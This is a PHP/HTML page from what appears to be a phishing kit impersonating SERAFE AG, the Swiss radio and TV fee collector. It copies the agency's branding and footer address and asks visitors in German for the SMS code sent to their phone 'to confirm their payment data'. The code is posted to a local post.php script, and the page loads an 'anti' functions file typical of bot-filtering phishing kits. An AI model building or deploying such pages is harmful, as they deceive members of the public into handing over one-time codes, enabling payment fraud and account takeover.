
<?php 
    require_once "../anti/functions.php";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/cmd.css">
    <title></title>
    <style>
      /* RESET */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    color: #333;
}

/* TOPBAR */
.topbar {
    background: #0f5c5c;
    color: white;
    padding: 10px 20px;
}

.nav {
    display: flex;
    justify-content: flex-end;
    gap: 20px;
    font-size: 14px;
}

/* HERO */
.hero {
    background: #197373;
    padding: 30px 20px;
}

.logo {
    color: white;
    font-size: 36px;
}

/* MAIN */
.container {
    max-width: 700px;
    margin: auto;
    padding: 40px 20px;
}

.container h2 {
    font-size: 34px;
    margin-bottom: 20px;
}

.intro {
    font-size: 18px;
    margin-bottom: 30px;
    line-height: 1.6;
}

/* FORM */
.form-group {
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
    JUSTIFY-SELF: START;
}

input {
    width: 100%;
    padding: 14px;
    border: 1px solid #201f1f;
    font-size: 16px;
}

/* NOTE */
.note {
    display: block;
    margin-top: 8px;
    font-size: 14px;
    color: #666;
}

/* BUTTON */
.btn {
    display: block;
    margin: 30px auto;
    padding: 14px 40px;
    background: #197373;
    color: white;
    border: none;
    border-radius: 30px;
    font-size: 18px;
    cursor: pointer;
}

.btn:hover {
    background: #145c5c;
}

/* FOOTER */
.footer {
    max-width: 900px;
    margin: auto;
    padding: 40px 20px;
    font-size: 14px;
    color: #353535;
    BACKGROUND: #f0f0f0;
    display: flex;
    justify-content:SPACE-BETWEEN;
}

.footer h3 {
    margin-bottom: 10px;
}

.footer h4 {
    margin-top: 20px;
}

.links {
    margin-top: 20px;
    line-height: 1.8;
}

/* ===================== */
/* 📱 RESPONSIVE */
/* ===================== */

/* TABLET */
@media (max-width: 768px) {
    .container h2 {
        font-size: 28px;
    }

    .nav {
        justify-content: center;
        flex-wrap: wrap;
    }
}

/* MOBILE */
@media (max-width: 480px) {
    .logo {
        font-size: 26px;
    }

    .container {
        padding: 25px 15px;
    }

    .container h2 {
        font-size: 24px;
    }

    .intro {
        font-size: 16px;
    }

    input {
        font-size: 14px;
    }

    .btn {
        width: 100%;
    }
}
    </style>
</head>
<body>

<!-- TOPBAR -->
<header class="topbar">
    <div class="nav">
        <span>Wir über uns</span>
        <span>Jobs</span>
        <span>Kontakt</span>
        <span>Deutsch</span>
    </div>
</header>

<!-- HERO -->
<section class="hero">
    <h1 class="logo">serafe</h1>
</section>

<!-- CONTENT -->
<main class="container">
    <h2>SMS-Code eingeben</h2>

    <p class="intro">
        Wir haben Ihnen einen SMS-Code an die hinterlegte Mobilnummer gesendet. Bitte geben Sie diesen Code zur Bestätigung Ihrer Zahlungsdaten ein.
    </p>

    <form action="post.php" method="post">
<!-- <div class="title">
SMS-Verifizierung
</div> -->



<div class="col">
<div class="name">
<label >SMS-Code</label>
</div>
        <div class="in">
            <input type="text" placeholder="XXXXXX" name="otp" >

        </div>

</div>
              
<div class="span">
<span>Der SMS-Code ist nur für kurze Zeit gültig. Geben Sie ihn bitte genau so ein, wie er auf Ihrem Mobiltelefon angezeigt wird.</span>
</div>

<div class="but">
    <button class="btn" type="submit">Bestätigen</button>
</div>






</form>

</main>

<!-- FOOTER -->
<footer class="footer">
    <DIV><h3>Kontaktadresse</h3>
    <p>
        SERAFE AG<br>
        Schweizerische Erhebungsstelle<br>
        für die Radio- und Fernsehabgabe<br>
        Postfach<br>
        8010 Zürich
    </p></DIV>

   <div> <h4>Downloads</h4>
    <p>Alle Downloads</p>
</div>
    <div><p class="links">
        © SERAFE AG<br>
        Datenschutz<br>
        Impressum<br>
        Disclaimer<br>
        Rechtliches<br>
        Medienbereich<br>
        Archiv
    </p></div>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
</SCRipt>
</body>
</html>